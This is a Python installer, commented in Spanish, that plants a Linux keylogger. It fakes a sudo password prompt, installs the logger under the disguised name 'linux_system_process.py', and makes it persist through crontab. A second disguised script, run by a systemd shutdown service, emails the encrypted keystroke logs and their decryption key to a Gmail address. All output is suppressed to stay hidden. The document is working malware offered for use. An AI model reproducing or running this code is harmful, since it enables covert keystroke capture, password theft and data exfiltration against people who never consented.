import os
import getpass
import subprocess
import threading

# Función para instalar automáticamente las dependencias necesarias del script
def install_dependencies():
    try:
        # Ejecuta pip para instalar las bibliotecas "keyboard", "cryptography" y "netifaces", suprimiendo la salida
        subprocess.check_call([os.sys.executable, "-m", "pip", "install", "keyboard", "cryptography", "netifaces", "--break-system-packages"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        exit(1)  # Si ocurre un error, termina el script con un código de salida 1

# Ejecuta la función para instalar las dependencias al inicio del script
install_dependencies()

# Archivo de bandera para indicar si la instalación ya se realizó
flag_file = "/var/log/installer_flag.txt"

# Función que verifica si el script tiene permisos de administrador
def check_admin():
    if os.geteuid() != 0:  # Verifica si el ID de usuario es root (0)
        print("Este script requiere privilegios de administrador. Por favor, ejecútelo con sudo.")
        exit(1)

# Simula la solicitud de contraseña de administrador (muestra un mensaje similar al de sudo)
def get_admin_password():
    password = getpass.getpass(prompt="Sorry, try again.\n[sudo] password for kali: ")
    return password

def create_shutdown_script():
    script_apagado = '''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import socket
import os
import netifaces
import time

log_dir = "/tmp/logs/"
key_path = '/tmp/logs/key.txt'

# Función para obtener la IP de la máquina (excluyendo la IP local 127.0.0.1)
def get_ip_address(retries=5, delay=5):
    for attempt in range(retries):
        try:
            # Recorre todas las interfaces de red para obtener una dirección IP
            for interface in netifaces.interfaces():
                if netifaces.AF_INET in netifaces.ifaddresses(interface):
                    ip_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
                    ip = ip_info['addr']
                    if ip != "127.0.0.1":  # Excluye la IP de loopback
                        return ip
            # Espera antes de reintentar
            time.sleep(delay)
        except Exception as e:
            time.sleep(delay)
    return "unknown_ip"

# Nombre del archivo log basado en la IP
ip_address = get_ip_address()
log_file = os.path.join(log_dir, f"{ip_address}.log")

# Configuración del correo
SMTP_SERVER = 'smtp.gmail.com'  # Cambia por tu servidor SMTP
SMTP_PORT = 587
SMTP_USER = 'senderemail@gmail.com'
SMTP_PASS = 'app_password' 
RECIPIENT = 'recipientemail@gmail.com'

# Función para leer la clave desde el archivo
def read_key():
    try:
        with open(key_path, 'rb') as archivo_clave:
            return archivo_clave.read().decode('utf-8')
    except Exception as e:
        #print(f"Error al leer la clave: {e}")
        return "Clave no disponible"

def enviar_correo():
    # Crear el directorio si no existe
    os.makedirs(log_dir, exist_ok=True)

    key_subject = read_key()

    # Crear el mensaje
    msg = MIMEMultipart()
    msg['From'] = SMTP_USER
    msg['To'] = RECIPIENT
    msg['Subject'] = key_subject

    # Adjuntar archivo
    if os.path.exists(log_file):
        with open(log_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={os.path.basename(log_file)}',
            )
            msg.attach(part)
    else:
        #print(f"Archivo {log_file} no encontrado")
        exit(1)

    # Enviar el mensaje
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(SMTP_USER, RECIPIENT, msg.as_string())
        server.quit()
        #print("Correo enviado correctamente")
    except Exception as e:
        #print(f"Error al enviar el correo: {e}")

if __name__ == "__main__":
    enviar_correo()

'''
    destination_path = "/usr/local/bin/shutdownandreboot.py"  # Destino donde se guarda el archivo de keylogger
    try:
        with open(destination_path, 'w') as f:
            f.write(script_apagado)
        os.chmod(destination_path, 0o711) 
    except Exception as e:
        exit(1)


def create_shutdownreboot_service():
    service_path = "/etc/systemd/system/shutdownandreboot.service"

    # Contenido del archivo de servicio
    service_content = """[Unit]
    Description=Enviar log antes del apagado o reinicio
    DefaultDependencies=no
    Before=shutdown.target reboot.target halt.target

    [Service]
    Type=oneshot
    ExecStart=/usr/bin/python3 /usr/local/bin/shutdownandreboot.py

    [Install]
    WantedBy=halt.target reboot.target shutdown.target
    """

    # Crear y escribir el archivo de servicio
    try:
        with open(service_path, 'w') as service_file:
            service_file.write(service_content)
        #print("Archivo de servicio creado exitosamente.")
    except Exception as e:
        #print(f"Error al crear el archivo de servicio: {e}")
        exit(1)

    # Habilitar el servicio sin salida estándar ni errores visibles
    try:
        subprocess.run(
            ["sudo", "systemctl", "enable", "shutdownandreboot.service"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True
        )
        #print("Servicio habilitado exitosamente.")
    except subprocess.CalledProcessError as e:
        #print(f"Error al habilitar el servicio: {e}")
        exit(1)

# Función que copia el código del keylogger en un archivo dentro de /usr/local/bin
def copy_keylogger():
    keylogger_code = '''#!/usr/bin/env python3
import os
import time
import sys
import smtplib
from cryptography.fernet import Fernet
import keyboard
import netifaces
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading

# Genera una clave para cifrar las teclas registradas
key = Fernet.generate_key()
cipher = Fernet(key)

# Ruta donde se guardarán los logs
log_dir = "/tmp/logs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)  # Crea el directorio si no existe
    os.chmod(log_dir, 0o777)  # Asigna permisos de escritura

with open('/tmp/logs/key.txt', 'wb') as crypto_key:
    crypto_key.write(key)

# Función para obtener la IP de la máquina (excluyendo la IP local 127.0.0.1)
def get_ip_address(retries=5, delay=5):
    for attempt in range(retries):
        try:
            # Recorre todas las interfaces de red para obtener una dirección IP
            for interface in netifaces.interfaces():
                if netifaces.AF_INET in netifaces.ifaddresses(interface):
                    ip_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
                    ip = ip_info['addr']
                    if ip != "127.0.0.1":  # Excluye la IP de loopback
                        return ip
            # Espera antes de reintentar
            time.sleep(delay)
        except Exception as e:
            time.sleep(delay)
    return "unknown_ip"

# Nombre del archivo log basado en la IP
log_file = os.path.join(log_dir, f"{get_ip_address()}.log")

# Función que registra la tecla presionada, cifrándola antes de guardarla en el archivo de log
def log_key_press(event):
    try:
        with open(log_file, 'ab') as log:
            encrypted_key = cipher.encrypt(event.name.encode())  # Cifra la tecla registrada
            log.write(encrypted_key + b"\\n")  # Escribe la tecla cifrada en el archivo de log
    except Exception as e:
        exit(1)

# Función para enviar el archivo de log por correo electrónico
def send_log_via_email(log_path, email_from, password, email_to):
    msg = MIMEMultipart()
    msg['From'] = email_from
    msg['To'] = email_to
    msg['Subject'] = key.decode()  # La clave de cifrado se usa como asunto

    with open(log_path, 'rb') as log_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(log_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_path)}')
        msg.attach(part)

    try:
        # Conexión al servidor de correo de Gmail para enviar el archivo
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_from, password)
        server.sendmail(email_from, email_to, msg.as_string())
        server.quit()

        # Borra el contenido del archivo de log después de enviarlo
        with open(log_path, 'w') as log_file:
            log_file.write('')
    except Exception as e:
        exit(1)

# Registra las teclas usando la biblioteca keyboard
def start_listener():
    keyboard.on_press(log_key_press)

listener_thread = threading.Thread(target=start_listener)  # Hilo para escuchar teclas presionadas
listener_thread.daemon = True
listener_thread.start()

# Ciclo infinito que envía el archivo de log cada 10 minutos si existe
while True:
    time.sleep(600)
    if os.path.exists(log_file):
        send_log_via_email(log_file, "senderemail@gmail.com", "app_password", "recipientemail@gmail.com")

'''

    dest_path = "/usr/local/bin/linux_system_process.py"  # Destino donde se guarda el archivo de keylogger
    try:
        with open(dest_path, 'w') as f:
            f.write(keylogger_code)
        os.chmod(dest_path, 0o755)  # Da permisos de ejecución al archivo
    except Exception as e:
        exit(1)

# Función que configura el keylogger para que inicie automáticamente al arrancar el sistema
def setup_autostart():
    with open('/etc/crontab', 'a') as crontab:
        crontab.write("@reboot root /usr/local/bin/linux_system_process.py\n")

# Verifica si ya se ha creado una bandera de instalación previa
def check_flag():
    return os.path.exists(flag_file)

# Crea un archivo de bandera para indicar que la instalación ya se realizó
def create_flag():
    try:
        with open(flag_file, 'w') as f:
            f.write("Installation complete")
        os.chmod(flag_file, 0o600)
    except Exception as e:
        exit(1)

# Ejecuta el keylogger inmediatamente después de la instalación
def execute_keylogger_immediately():
    dest_path = "/usr/local/bin/linux_system_process.py"
    try:
        subprocess.Popen(
            ['python3', dest_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp
        )
    except Exception as e:
        exit(1)

# ---- Instalación ----
if check_flag():
    exit(0)  # Sale del script si ya está instalado

check_admin()  # Verifica que el usuario tenga permisos de administrador
admin_password = get_admin_password()  # Pide contraseña de administrador (simulada)
copy_keylogger()  # Copia el keylogger al sistema
setup_autostart()  # Configura el arranque automático
create_flag()  # Crea la bandera de instalación
execute_keylogger_immediately()  # Ejecuta el keylogger inmediatamente
create_shutdown_script()
create_shutdownreboot_service()